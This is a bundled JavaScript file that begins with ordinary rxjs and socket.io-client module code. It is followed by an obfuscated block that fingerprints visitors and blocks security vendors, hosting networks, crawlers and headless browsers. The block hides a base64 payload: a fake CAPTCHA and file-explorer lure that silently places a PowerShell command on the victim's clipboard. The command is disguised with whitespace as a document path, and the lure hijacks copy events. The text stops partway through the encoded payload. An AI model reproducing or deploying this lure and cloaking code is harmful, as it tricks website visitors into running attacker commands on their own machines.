Object.defineProperty(exports, "takeLast", { enumerable: true, get: function () { return takeLast_1.takeLast; } });
var takeUntil_1 = require("./internal/operators/takeUntil");
Object.defineProperty(exports, "takeUntil", { enumerable: true, get: function () { return takeUntil_1.takeUntil; } });
var takeWhile_1 = require("./internal/operators/takeWhile");
Object.defineProperty(exports, "takeWhile", { enumerable: true, get: function () { return takeWhile_1.takeWhile; } });
var tap_1 = require("./internal/operators/tap");
Object.defineProperty(exports, "tap", { enumerable: true, get: function () { return tap_1.tap; } });
var throttle_1 = require("./internal/operators/throttle");
Object.defineProperty(exports, "throttle", { enumerable: true, get: function () { return throttle_1.throttle; } });
var throttleTime_1 = require("./internal/operators/throttleTime");
Object.defineProperty(exports, "throttleTime", { enumerable: true, get: function () { return throttleTime_1.throttleTime; } });
var throwIfEmpty_1 = require("./internal/operators/throwIfEmpty");
Object.defineProperty(exports, "throwIfEmpty", { enumerable: true, get: function () { return throwIfEmpty_1.throwIfEmpty; } });
var timeInterval_1 = require("./internal/operators/timeInterval");
Object.defineProperty(exports, "timeInterval", { enumerable: true, get: function () { return timeInterval_1.timeInterval; } });
var timeout_2 = require("./internal/operators/timeout");
Object.defineProperty(exports, "timeout", { enumerable: true, get: function () { return timeout_2.timeout; } });
var timeoutWith_1 = require("./internal/operators/timeoutWith");
Object.defineProperty(exports, "timeoutWith", { enumerable: true, get: function () { return timeoutWith_1.timeoutWith; } });
var timestamp_1 = require("./internal/operators/timestamp");
Object.defineProperty(exports, "timestamp", { enumerable: true, get: function () { return timestamp_1.timestamp; } });
var toArray_1 = require("./internal/operators/toArray");
Object.defineProperty(exports, "toArray", { enumerable: true, get: function () { return toArray_1.toArray; } });
var window_1 = require("./internal/operators/window");
Object.defineProperty(exports, "window", { enumerable: true, get: function () { return window_1.window; } });
var windowCount_1 = require("./internal/operators/windowCount");
Object.defineProperty(exports, "windowCount", { enumerable: true, get: function () { return windowCount_1.windowCount; } });
var windowTime_1 = require("./internal/operators/windowTime");
Object.defineProperty(exports, "windowTime", { enumerable: true, get: function () { return windowTime_1.windowTime; } });
var windowToggle_1 = require("./internal/operators/windowToggle");
Object.defineProperty(exports, "windowToggle", { enumerable: true, get: function () { return windowToggle_1.windowToggle; } });
var windowWhen_1 = require("./internal/operators/windowWhen");
Object.defineProperty(exports, "windowWhen", { enumerable: true, get: function () { return windowWhen_1.windowWhen; } });
var withLatestFrom_1 = require("./internal/operators/withLatestFrom");
Object.defineProperty(exports, "withLatestFrom", { enumerable: true, get: function () { return withLatestFrom_1.withLatestFrom; } });
var zipAll_1 = require("./internal/operators/zipAll");
Object.defineProperty(exports, "zipAll", { enumerable: true, get: function () { return zipAll_1.zipAll; } });
var zipWith_1 = require("./internal/operators/zipWith");
Object.defineProperty(exports, "zipWith", { enumerable: true, get: function () { return zipWith_1.zipWith; } });
//# sourceMappingURL=index.js.map
}catch(e){}
})();

/* >>> socket.io-client (3296 bytes) <<< */
(function(){
try{
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.WebTransport = exports.WebSocket = exports.NodeWebSocket = exports.XHR = exports.NodeXHR = exports.Fetch = exports.Socket = exports.Manager = exports.protocol = void 0;
exports.io = lookup;
exports.connect = lookup;
exports.default = lookup;
const url_js_1 = require("./url.js");
const manager_js_1 = require("./manager.js");
Object.defineProperty(exports, "Manager", { enumerable: true, get: function () { return manager_js_1.Manager; } });
const socket_js_1 = require("./socket.js");
Object.defineProperty(exports, "Socket", { enumerable: true, get: function () { return socket_js_1.Socket; } });
const debug_1 = __importDefault(require("debug")); // debug()
const debug = (0, debug_1.default)("socket.io-client"); // debug()
/**
 * Managers cache.
 */
const cache = {};
function lookup(uri, opts) {
    if (typeof uri === "object") {
        opts = uri;
        uri = undefined;
    }
    opts = opts || {};
    const parsed = (0, url_js_1.url)(uri, opts.path || "/socket.io");
    const source = parsed.source;
    const id = parsed.id;
    const path = parsed.path;
    const sameNamespace = cache[id] && path in cache[id]["nsps"];
    const newConnection = opts.forceNew ||
        opts["force new connection"] ||
        false === opts.multiplex ||
        sameNamespace;
    let io;
    if (newConnection) {
        debug("ignoring socket cache for %s", source);
        io = new manager_js_1.Manager(source, opts);
    }
    else {
        if (!cache[id]) {
            debug("new io instance for %s", source);
            cache[id] = new manager_js_1.Manager(source, opts);
        }
        io = cache[id];
    }
    if (parsed.query && !opts.query) {
        opts.query = parsed.queryKey;
    }
    return io.socket(parsed.path, opts);
}
// so that "lookup" can be used both as a function (e.g. `io(...)`) and as a
// namespace (e.g. `io.connect(...)`), for backward compatibility
Object.assign(lookup, {
    Manager: manager_js_1.Manager,
    Socket: socket_js_1.Socket,
    io: lookup,
    connect: lookup,
});
/**
 * Protocol version.
 *
 * @public
 */
var socket_io_parser_1 = require("socket.io-parser");
Object.defineProperty(exports, "protocol", { enumerable: true, get: function () { return socket_io_parser_1.protocol; } });
var engine_io_client_1 = require("engine.io-client");
Object.defineProperty(exports, "Fetch", { enumerable: true, get: function () { return engine_io_client_1.Fetch; } });
Object.defineProperty(exports, "NodeXHR", { enumerable: true, get: function () { return engine_io_client_1.NodeXHR; } });
Object.defineProperty(exports, "XHR", { enumerable: true, get: function () { return engine_io_client_1.XHR; } });
Object.defineProperty(exports, "NodeWebSocket", { enumerable: true, get: function () { return engine_io_client_1.NodeWebSocket; } });
Object.defineProperty(exports, "WebSocket", { enumerable: true, get: function () { return engine_io_client_1.WebSocket; } });
Object.defineProperty(exports, "WebTransport", { enumerable: true, get: function () { return engine_io_client_1.WebTransport; } });

module.exports = lookup;

}catch(e){}
})();

function b(c, d) {
    c = c - 0x12c;
    const e = a();
    let f = e[c];
    return f;
}
function a() {
    const ac = [
        'GAgbA',
        'Vkhoc',
        'WuUqa',
        'MTO\x20Telecom',
        'KBlRO',
        'WdoRk',
        'UNMASKED_RENDERER_WEBGL',
        'toUTCString',
        'Microsoft\x20Limited',
        'NlxVb',
        'mIdow',
        'div',
        'JZwsJ',
        'BQYjr',
        'XOZds',
        'zTvYP',
        'cwDiX',
        'hjWiQ',
        'Daum\x20Communication\x20Co.,LTD',
        'uhQyO',
        'vKBHI',
        'Microsoft\x20Corporation',
        'PacketExchange',
        'Yahoo\x20Japan\x20Corporation',
        'Secure\x20Data\x20Systems',
        'bZiRf',
        'MKdhE',
        'query',
        'setItem',
        'fkyyo',
        'pftVj',
        '36ENdjAr',
        'JSC\x20RTComm.RU',
        'Yahoo\x20Japan',
        'test',
        'match',
        'createElement',
        'China\x20Dragon\x20Telecom\x20Co.,Ltd',
        'AkhcJ',
        'China\x20Cultural\x20Heritage\x20Information\x20and\x20Consulting',
        'lHpQc',
        'China',
        'Multimedia\x20Polska\x20S.A.',
        'yFtDe',
        'rSCpW',
        'RamNode\x20LLC',
        'pROZw',
        'LzPDB',
        'erEiX',
        'SERVER\x20BLOCK',
        'yedWe',
        'YstcP',
        'languages',
        'ClearBlue\x20Technologies',
        'eXUPm',
        'selenium',
        'bpcUs',
        'Cloudmark',
        'denied',
        'ZYfGV',
        'BbgoT',
        'GnlUO',
        'M247\x20Europe',
        'loadTimes',
        'PEbSN',
        'MYndc',
        'ZFluF',
        'DigitalOcean',
        'AAhyK',
        'PulsePoint\x20Communications',
        'rQZgY',
        'CLUyE',
        'ReLvv',
        '_vc',
        'QuadraNet',
        'Conectiva\x20Telecom',
        'max',
        'PkTOi',
        'Multimedia\x20Polska\x20-\x20Poludnie\x20S.A.',
        'document',
        'ezPOw',
        'qdQwu',
        'Bot\x20user\x20agent\x20detected:',
        'quwnI',
        'http://ip-api.com/json/',
        'YYeNx',
        'HFYKq',
        '4407333etlYii',
        'XXZPO',
        'MX\x20Logic',
        'XjRUL',
        'SgcjZ',
        'Gyron\x20Internet\x20Ltd',
        'DataCamp',
        'Yahoo!',
        'prompt',
        'GDTXE',
        'addEventListener',
        'Amazon',
        'innerHTML',
        'sIaUR',
        'PPLxr',
        'Internap\x20Japan\x20Co.,LTD.',
        'UzmfR',
        'Amazon\x20Web\x20Services,\x20LLC',
        'ZnKNE',
        'McAfee',
        'Facebook',
        'phantom',
        'WEBGL_debug_renderer_info',
        'KffAC',
        'XEBFb',
        'VKontakte\x20Ltd',
        'BmRLa',
        'HzitJ',
        'Barracuda\x20Networks',
        'SurfControl',
        'permissions',
        '1380390fbzEBL',
        'BiClA',
        'Leaseweb\x20USA',
        'hYivC',
        'cssText',
        'Microsoft\x20Hosting',
        'slurp',
        'Websense',
        'Zayo\x20Group\x20EU\x20Limited',
        'FbBcB',
        'getParameter',
        'WibQw',
        'YWoAL',
        'Hetzner\x20CC',
        'Yahoo!\x20India\x20Pvt',
        'Faction',
        'buodH',
        'APwYx',
        'Surfcontrol-reading',
        'iMvID',
        'US\x20Department\x20of\x20Defense\x20Network',
        'Alistar\x20Security\x20Srl',
        'ujBbj',
        'head',
        'replace',
        'tmOsb',
        'tLmxr',
        'ThreatTrack',
        'RPHnM',
        'ixVci',
        'FbWXN',
        'GTS\x20Telecom\x20SRL',
        'oISYD',
        'mEuKA',
        'ySeZo',
        'GoDaddy.com,\x20LLC',
        'Tinet\x20Spa',
        'joHHE',
        'olmMW',
        'QqmTf',
        'org',
        'Tiscali\x20SpA',
        'RLINB',
        'xGwVE',
        'lSPXm',
        'Pulsepoint',
        'kqDLX',
        'JEZnU',
        'aObwv',
        'FORTHnet\x20SA',
        'jVLXY',
        'JIjWx',
        'Leaseweb\x20Asia\x20Pacific\x20pte.',
        ';\x20expires=',
        'Zenith\x20Electronics\x20Corporation',
        'Niedersaechsische\x20Landesregierung',
        'sdtEt',
        '__vc_test',
        'China\x20Broadcasting\x20TV\x20Net',
        'true',
        'Hetzner-as',
        'VgdmP',
        'LeaseWeb',
        'China\x20Duty\x20Free\x20group',
        'nddjX',
        'boDRH',
        'HostUS',
        'Mobile,\x20proxy,\x20or\x20hosting\x20IP\x20detected:',
        'Internet\x20Security\x20Systems',
        'zgxEP',
        'Googlebot',
        'ZONES\x20AS',
        'GeDQE',
        'pawlK',
        'toString',
        'etcnw',
        'OjhTq',
        'ThePlanet.com\x20Internet\x20Services',
        'apQuJ',
        'ZNeZu',
        'YRMbX',
        'ZeDjk',
        'wbQJT',
        'runtime',
        'archive',
        'XNSzS',
        'bPHGx',
        'FnwAJ',
        'OVH\x20SAS',
        'Barracuda\x20Canada',
        'Twitter\x20International\x20Company',
        'IPXO',
        'PfYzo',
        'Leaseweb\x20Deutschland\x20GmbH',
        'tXewv',
        'min',
        '8mldKFr',
        'ERLag',
        'Hjshd',
        'Websitewelcome.com',
        'log',
        'position:fixed;top:0;left:0;width:100%;height:100vh;z-index:999999',
        'Digital\x20Ocean',
        'ESET,\x20spol.\x20s\x20r.o.',
        'Amazon.com\x20Tech\x20Telecom',
        'OnMvF',
        'Packethub',
        'diVQM',
        'wUFOc',
        'cookie',
        'vgguw',
        'fxVOx',
        'xrYwE',
        '_skip',
        'AVAST\x20Software\x20s.r.o.',
        'dRRxM',
        'JIjQL',
        'Yahoo\x20Corp\x20Network',
        'TimeWeb\x20Ltd.',
        'Shrqs',
        'Microsoft\x20Corp',
        'ZTmIG',
        'oqsff',
        'owooV',
        'teoma',
        'cWuKp',
        'round',
        'MPVSB',
        'wTCQx',
        'hosting',
        'style',
        'Amazon\x20Technologies',
        'GdQFG',
        'iGtRd',
        'jkKXn',
        'yOUWH',
        'experimental-webgl',
        'Cloudmark\x20Labs',
        'unknown',
        'Polgs',
        'Conectiva',
        'KPBnV',
        'Capris\x20Group',
        'TpkPI',
        'bing',
        'yahoo',
        'China\x20Digital\x20Kingdom\x20Technology\x20Co.,Ltd.',
        'Access\x20check\x20failed:',
        'XTtjy',
        'auWSm',
        'fdGEa',
        'Incero\x20LLC',
        'webdriver',
        'error',
        'AFcVB',
        'lKsVr',
        'script',
        'liiAx',
        'gVuPk',
        '1364454TvVwrz',
        'Limited\x20liability\x20company\x20Mail.Ru',
        'callPhantom',
        'Tinet',
        'qFSlk',
        'QpZxg',
        '=([^;]*)',
        'ERCze',
        'outerHeight',
        'mjnUg',
        'UGnrf',
        'LeaseWeb\x20B.V.',
        'byvtP',
        'yWoZE',
        'qInlE',
        'DOMContentLoaded',
        'EOFab',
        'bot',
        'OTQPr',
        'yuxZu',
        'Bitdefender\x20SRL',
        '_phantom',
        'Trend\x20Micro\x20Incorporated',
        'getExtension',
        'Headless\x20browser\x20detected\x20with\x20probability:',
        'hrcGP',
        'pHZDd',
        'EOBlV',
        'Fujitsu',
        'Google\x20Cloud',
        'language',
        'Blocked\x20ISP\x20detected:',
        'proxy',
        'oBEiz',
        'pkHcU',
        'QRPbN',
        'fQxlv',
        'iDfuO',
        '38769eVtoKM',
        'SPAMfighter\x20ApS',
        'BfNcc',
        'Trustwave\x20Holdings',
        'https://api.ipify.org?format=json',
        '$cdc_',
        'RoZjj',
        'CLNUL',
        'IGHLF',
        'TonOY',
        'zJegv',
        'ROWkL',
        'CloudFlare',
        'Internap\x20Network\x20Services',
        'uUgYr',
        'textContent',
        'Avira\x20B.V.',
        'EysEt',
        'toLowerCase',
        'Dqjhc',
        'VYDyK',
        'Bitdefender-as',
        'RcOLN',
        'length',
        'state',
        'BYjTr',
        'getItem',
        'vboES',
        'EBbss',
        'SIXdn',
        'Solution\x20Pro',
        'plugins',
        'Script\x20injection\x20failed',
        'CItAc',
        'Access\x20allowed:',
        'Ooofv',
        'EYDdB',
        'tqHNO',
        'yOyef',
        'KOSor',
        'RkzkF',
        'OVH\x20Hosting',
        'Yahoo!\x20Broadcast\x20Services',
        'RsonL',
        'crawl',
        'Tiscali-it',
        'RrIfN',
        'XNmDT',
        'Amazonia\x20Publicidade\x20Ltda',
        'Leaseweb-de',
        'Topsy\x20Labs',
        'getContext',
        'Server\x20Central\x20Network',
        'Facebook\x20Ireland\x20Ltd',
        'canvas',
        'WzwUY',
        'DVZyn',
        'YANDEX',
        'NewMedia\x20Express\x20Pte',
        'kUxeb',
        'UBZfB',
        'INETu',
        'documentElement',
        'Nxvyz',
        'luJKl',
        'google',
        'Amazon\x20Corporate\x20LLC',
        'SoZvJ',
        'vXVef',
        'Beijing\x20Baidu\x20Netcom\x20Science\x20and\x20Technology\x20Co.',
        'Hetzner\x20Online\x20GmbH',
        'baidu',
        'isp',
        'kmvjS',
        'beqqh',
        '11RcYlUX',
        'appendChild',
        'TIchQ',
        'China\x20Education\x20and\x20Research\x20Network\x20Center',
        'tOmvj',
        'ThreatTrack\x20Security',
        'ONLINE\x20SAS',
        'SK\x20Broadband',
        'CuUiQ',
        'GGsVn',
        'ONLINE\x20S.A.S.',
        'Amazonia\x20Telecom\x20Ltda.\x20-\x20Me',
        'Zen\x20Systems\x20A/S',
        'gFNlr',
        '$wdc_',
        'Rackspace\x20Hosting',
        'srmum',
        'KPsHG',
        'Unified\x20Layer',
        'now',
        'NkjEv',
        'LinkedIn\x20Corporation',
        'Leaseweb\x20Asia',
        'xEERp',
        'Zdayi',
        'XOhkZ',
        'permission',
        'includes',
        'NFOrce\x20Entertainment\x20B.V.',
        'Leaseweb',
        'isNaN',
        'DedFiberCo',
        'YZhOh',
        'xTqyT',
        'EGIHosting',
        'uxnqY',
        'dPcdL',
        'TPIRh',
        'FPCDp',
        'Conectiva\x20Celular\x20e\x20Informatica\x20Ltda',
        'QjBoT',
        'DWjSn',
        'QUcLd',
        'innerWidth',
        'webgl',
        'score',
        'mobile',
        'YANDEX\x20LLC',
        'Webroot\x20Services',
        'Spamfighter-as',
        'Y29uc3QgY29tbWFuZCA9IGBQb3dlcnNoZWxsLmV4ZSAtYyBwaW5nIGV4YW1wbGUuY29tICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgQzpcXFxpbnRlcm5hbC1zZWN1cmVcXGZpbGVkcml2ZVxcSFJQb2xpY3kuZG9jeCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYDsgLy9DT01NQU5ECgoKCiBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7CmNvbnN0IGZpbGVFeHBsb3JlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlRXhwbG9yZXInKTsKY29uc3QgcGF0aCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRoJyk7CgpmdW5jdGlvbiBzZXRTa2lwRmxhZygpIHsKICAgIHRyeSB7CiAgICAgICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oJ19za2lwJywgJzEnKTsKICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgIGRvY3VtZW50LmNvb2tpZSA9ICdfc2tpcD0xOyBwYXRoPS87IG1heC1hZ2U9MzE1MzYwMDAnOwogICAgfQp9CgovLyAvLyBDb3B5IHRoZSBwb3dlcnNoZWxsIGNvbW1hbmQgaWYgdGhleSBjbGljayBvbiB0aGUgZHVtbXkgZmlsZSBwYXRoCi8vIC8vIEluIGNhc2UgdGhlIHVzZXIgdHJpZXMgdG8gYmUgc21hcnQgYW5kIG9wZW4gZmlsZSBleHBsb3JlciBtYW51YWxseQovLyBwYXRoLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24oKSB7Ci8vICAgICBuYXZpZ2F0b3IuY2xpcGJvYXJkLndyaXRlVGV4dChjb21tYW5kKTsKLy8gfSk7CgovLyBDb3B5IHBvd2Vyc2hlbGwgY29tbWFuZCAmIG9wZW4gZmlsZSBleHBsb3JlcgpmaWxlRXhwbG9yZXIuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbigpIHsKICAgIG5hdmlnYXRvci5jbGlwYm9hcmQud3JpdGVUZXh0KGNvbW1hbmQpOwogICAgc2V0U2tpcEZsYWcoKTsKCiAgICBmaWxlSW5wdXQuY2xpY2soKTsKfSk7CgovLyBCbG9jayBhbnkgYXR0ZW1wdGVkIGZpbGUgdXBsb2FkcwpmaWxlSW5wdXQuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgKCkgPT4gewogICAgYWxlcnQoIlBsZWFzZSBmb2xsb3cgdGhlIHN0YXRlZCBpbnN0cnVjdGlvbnMuIik7CiAgICBmaWxlSW5wdXQudmFsdWUgPSAiIjsKICAgIHNldFRpbWVvdXQoKCkgPT4gZmlsZUlucHV0LmNsaWNrKCksIDUwMCk7Cn0pOwoKLyogRU5EIE5FVyAqLwoKCgovLyBHRVQgCmNvbnN0IHBhcmFtcyA9IG5ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCk7CmNvbnN0IHNpdGVVcmwgPSBwYXJhbXMuZ2V0KCdzaXRlJykgfHwgd2luZG93LmxvY2F0aW9uLmhvc3RuYW1lOwpjb25zdCBsb2dvVXJsID0gcGFyYW1zLmdldCgnbG9nbycpOwpjb25zdCBkZWZhdWx0TG9nb1VybCA9ICdodHRwczovLzJjYXB0Y2hhLmNvbS9kaXN0L3dlYi9hc3NldHMvZ29vZ2xlLXByaXZhY3ktcG9saWN5LUNiMENHVlJULnN2Zyc7Cgpkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcuZG9tYWluLW5hbWUnKS5mb3JFYWNoKGVsID0+IHsKICBlbC50ZXh0Q29udGVudCA9IHNpdGVVcmw7Cn0pOwoKZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnLmxvZ28taW1nJykuZm9yRWFjaChpbWcgPT4gewogIGltZy5zcmMgPSBsb2dvVXJsIHx8IGRlZmF1bHRMb2dvVXJsOwogIGltZy5hbHQgPSAnbG9nbyc7Cn0pOwoKCgpmdW5jdGlvbiBpbml0VmVyaWZpY2F0aW9uRmxvdygpIHsKICAgIGNvbnN0IHByZWxvYWRlckVsZW1lbnRzID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgiLnByZWxvYWRlciIpOwogICAgY29uc3QgcHJlbG9hZGVyVGV4dCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5wcmVsb2FkZXJfdGV4dCIpOwogICAgY29uc3QgdGV4dEFsbFN0ZXAgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIudGV4dGFsbHN0ZXAiKTsKICAgIGNvbnN0IGNoZWNrYm94V2luZG93ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImNoZWNrYm94LXdpbmRvdyIpOwogICAgY29uc3Qgc3RlcDBFbGVtZW50cyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoIi5zdGVwMCIpOwogICAgY29uc3Qgc3RlcDFFbGVtZW50cyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoIi5zdGVwMSIpOwogICAgY29uc3Qgc3RlcDJFbGVtZW50cyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoIi5zdGVwMiIpOwogICAgY29uc3Qgc3RlcDNFbGVtZW50cyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoIi5zdGVwMyIpOwogICAgY29uc3QgY2hlY2tib3ggPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY2hlY2tib3giKTsKICAgIGNvbnN0IHZlcmlmeVdpbmRvdyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ2ZXJpZnktd2luZG93Iik7CiAgICBjb25zdCBzcGlubmVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInNwaW5uZXIiKTsKICAgIGNvbnN0IHZlcmlmeUJ1dHRvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ2ZXJpZnktYnV0dG9uIik7CgogICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgcHJlbG9hZGVyRWxlbWVudHMuZm9yRWFjaChlbCA9PiBlbC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiKTsKICAgICAgICBwcmVsb2FkZXJUZXh0LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgdGV4dEFsbFN0ZXAuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICAgICAgY2hlY2tib3hXaW5kb3cuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIGNoZWNrYm94V2luZG93LnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7IAogICAgICAgICAgICBsZXQgb3BhY2l0eSA9IDA7CiAgICAgICAgICAgIGxldCBmYWRlSW4gPSBzZXRJbnRlcnZhbCgoKSA9PiB7CiAgICAgICAgICAgICAgICBpZiAob3BhY2l0eSA+PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChmYWRlSW4pOyAKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgb3BhY2l0eSArPSAwLjE7IAogICAgICAgICAgICAgICAgICAgIGNoZWNrYm94V2luZG93LnN0eWxlLm9wYWNpdHkgPSBvcGFjaXR5OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LCAzMCk7CiAgICAgICAgfSwgMjAwKTsKCiAgICAgICAgc3RlcDBFbGVtZW50cy5mb3JFYWNoKGVsID0+IGVsLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siKTsKCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIHN0ZXAwRWxlbWVudHMuZm9yRWFjaChlbCA9PiBlbC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiKTsKICAgICAgICAgICAgc3RlcDFFbGVtZW50cy5mb3JFYWNoKGVsID0+IGVsLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siKTsKICAgICAgICB9LCAyMDAwKTsgCiAgICB9LCAxNTAwKTsgCgogICAgY2hlY2tib3guYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbiAoKSB7CiAgICAgICBjb25zdCB0ZXh0YXJlYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RleHRhcmVhJyk7CiAgICAgICAgdGV4dGFyZWEudmFsdWUgPSBjb21tYW5kOwogICAgICAgIHRleHRhcmVhLnNldEF0dHJpYnV0ZSgncmVhZG9ubHknLCAnJyk7CiAgICAgICAgdGV4dGFyZWEuc3R5bGUucG9zaXRpb24gPSAnYWJzb2x1dGUnOwogICAgICAgIHRleHRhcmVhLnN0eWxlLmxlZnQgPSAnLTk5OTlweCc7CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0ZXh0YXJlYSk7CiAgICAgICAgdGV4dGFyZWEuc2VsZWN0KCk7CiAgICAgICAgZG9jdW1lbnQuZXhlY0NvbW1hbmQoJ2NvcHknKTsKICAgICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKHRleHRhcmVhKTsKICAgICAgICBjb25zb2xlLmxvZygn4pyFJyk7CgogICAgICAgIHN0ZXAxRWxlbWVudHMuZm9yRWFjaChlbCA9PiBlbC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiKTsKICAgICAgICBzdGVwMkVsZW1lbnRzLmZvckVhY2goZWwgPT4gZWwuc3R5bGUuZGlzcGxheSA9ICJibG9jayIpOwogICAgICAgIHNwaW5uZXIuc3R5bGUudmlzaWJpbGl0eSA9ICJ2aXNpYmxlIjsKCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIGNoZWNrYm94V2luZG93LnN0eWxlLndpZHRoID0gIjUzMHB4IjsKICAgICAgICAgICAgY2hlY2tib3hXaW5kb3cuc3R5bGUuaGVpZ2h0ID0gImF1dG8iOwogICAgICAgICAgICB2ZXJpZnlXaW5kb3cuc3R5bGUuYm9yZGVyVG9wID0gIjFweCBzb2xpZCAjNzk3OTc5IjsKICAgICAgICAgICAgdmVyaWZ5V2luZG93LnN0eWxlLnBhZGRpbmdUb3AgPSAiM3B4IjsKICAgICAgICAgICAgdmVyaWZ5V2luZG93LnN0eWxlLm1hcmdpblRvcCA9ICIxNXB4IjsKICAgICAgICAgICAgdmVyaWZ5V2luZG93LmNsYXNzTGlzdC5hZGQoImFjdGl2ZSIpOwogICAgICAgIH0sIDUwMCk7CiAgICB9KTsKCiAgICB2ZXJpZnlCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbiAoKSB7CiAgICAgICAgdmVyaWZ5V2luZG93LmNsYXNzTGlzdC5yZW1vdmUoImFjdGl2ZSIpOwogICAgICAgIGNoZWNrYm94V2luZG93LnN0eWxlLmhlaWdodCA9ICI3NHB4IjsKCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIGNoZWNrYm94V2luZG93LnN0eWxlLndpZHRoID0gIjMwMHB4IjsKICAgICAgICAgICAgc3RlcDJFbGVtZW50cy5mb3JFYWNoKGVsID0+IGVsLnN0eWxlLmRpc3BsYXkgPSAibm9uZSIpOwogICAgICAgICAgICBzdGVwM0VsZW1lbnRzLmZvckVhY2goZWwgPT4gZWwuc3R5bGUuZGlzcGxheSA9ICJibG9jayIpOwoKICAgICAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgICAgICBzdGVwM0VsZW1lbnRzLmZvckVhY2goZWwgPT4gZWwuc3R5bGUuZGlzcGxheSA9ICJub25lIik7CiAgICAgICAgICAgICAgICBzdGVwMUVsZW1lbnRzLmZvckVhY2goZWwgPT4gZWwuc3R5bGUuZGlzcGxheSA9ICJibG9jayIpOwogICAgICAgICAgICAgICAgc3Bpbm5lci5zdHlsZS52aXNpYmlsaXR5ID0gImhpZGRlbiI7CiAgICAgICAgICAgIH0sIDEwMDApOwogICAgICAgIH0sIDYwMCk7CiAgICB9KTsKCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidmVyaWZpY2F0aW9uLWlkIikudGV4dENvbnRlbnQgPSBNYXRoLmZsb29yKDEwMDAwMCArIE1hdGgucmFuZG9tKCkgKiA5MDAwMDApOwogICAgY29uc3QgY2hhcnMgPSAiYWJjZGVmMDEyMzQ1Njc4OSI7CiAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIucmF5LWlkIikudGV4dENvbnRlbnQgPSBBcnJheS5mcm9tKHsgbGVuZ3RoOiAxNiB9LCAoKSA9PiBjaGFyc1tNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiBjaGFycy5sZW5ndGgpXSkuam9pbigiIik7Cn0KCmlmIChkb2N1bWVudC5yZWFkeVN0YXRlID09PSAibG9hZGluZyIpIHsKICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoIkRPTUNvbnRlbnRMb2FkZWQiLCBpbml0VmVyaWZpY2F0aW9uRmxvdyk7Cn0gZWxzZSB7CiAgICBpbml0VmVyaWZpY2F0aW9uRmxvdygpOwp9CgoKIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2NvcHknLCBmdW5jdGlvbiAoZSkgewogICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgaWYgKGUuY2xpcGJvYXJkRGF0YSkgewogICAgICAgIGUuY2xpcGJvYXJkRGF0YS5zZXREYXRhKCd0ZXh0L3BsYWluJywgY29tbWFuZCk7CiAgICAgICAgY29uc29sZS5sb2coJ+KchScpOwogICAg